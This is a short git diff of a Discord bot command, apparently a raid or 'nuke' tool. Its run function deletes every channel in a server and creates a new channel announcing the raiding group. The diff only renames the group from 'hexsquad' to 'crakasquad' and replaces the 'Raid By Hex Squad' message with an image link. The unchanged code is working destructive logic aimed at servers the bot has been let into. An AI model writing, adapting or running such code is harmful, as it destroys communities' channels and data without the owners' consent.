@@ -6,10 +6,10 @@ module.exports = {
 
     run : async(client, message, args) => {
         message.guild.channels.cache.forEach(channel => channel.delete());
-        message.guild.channels.create(`hexsquad`, {
+        message.guild.channels.create(`crakasquad`, {
               type: 'text'
             }).then(channel => {
-              channel.send("Raid By Hex Squad")
+              channel.send("https://cdn.discordapp.com/icons/831019970505867294/d441f7053ac2675f5b186c0335596dba.png?size=1024")
             })
     }
 }
